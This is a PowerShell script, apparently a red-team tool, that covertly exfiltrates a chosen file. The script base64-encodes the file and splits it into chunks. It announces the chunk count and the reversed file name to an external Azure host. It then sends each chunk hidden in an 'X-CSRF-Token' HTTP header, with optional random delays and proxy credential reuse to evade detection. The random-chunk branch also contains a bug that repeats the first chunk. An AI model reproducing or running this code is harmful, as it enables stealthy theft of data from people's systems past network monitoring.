
param(
    [string[]] $FileName,
    [Int] $ChunkSize,
	[switch] $RandSleep,
	[switch] $RandChunk
	
)


$url = "redteamrox.eastus.cloudapp.azure.com"

if (!$filename) { $filename = Read-Host -Prompt 'Enter your filename (including extension if exists)' }

$finalData =[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
$proxy = [System.Net.WebRequest]::GetSystemWebproxy()
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials

if($RandChunk) {
	echo "Splitting in random chunks"
	
	$chunkSizes = @()
	$chunks = @()
    $remainingLength = $finalData.Length
    while ($remainingLength -gt 0) {
        $chunkSize = (Get-Random -Minimum 25 -Maximum 100)*4
        if ($chunkSize -gt $remainingLength) {
            $chunkSize = $remainingLength
        }
        $chunkSizes += $chunkSize
        $remainingLength -= $chunkSize
    }
	
	$startIndex = 0
    foreach ($size in $chunkSizes) {
        $chunk = $finalData.Substring($startIndex, $size)
		$chunks += $chunk
    }
	
$split_count = $chunkSizes.Length
echo $split_count
	
} else {
$chunks = $finalData -split "(\S{$($ChunkSize)})" | ? {$_}
$split_count = ([regex]::Matches($chunks, "(\S{$($ChunkSize)})" )).count
}

echo "File splitted by $split_count times"

$emanelif = -join $filename[-1..-$filename.Length]

Invoke-WebRequest -Uri $url"/menu.php?w="$split_count
Invoke-WebRequest -Uri $url"/menu.php?query="$emanelif

foreach ($num in $chunks) {
Get-Random -Count 1 -InputObject (97..122) | % -begin {$randomchar=$null} -process {$randomchar += [char]$_}
if($RandSleep) {
Get-Random -Count 1 -InputObject (1..5) | Start-Sleep
}
$Response = Invoke-WebRequest -Uri $url -Headers @{"X-CSRF-Token"="$num"}
}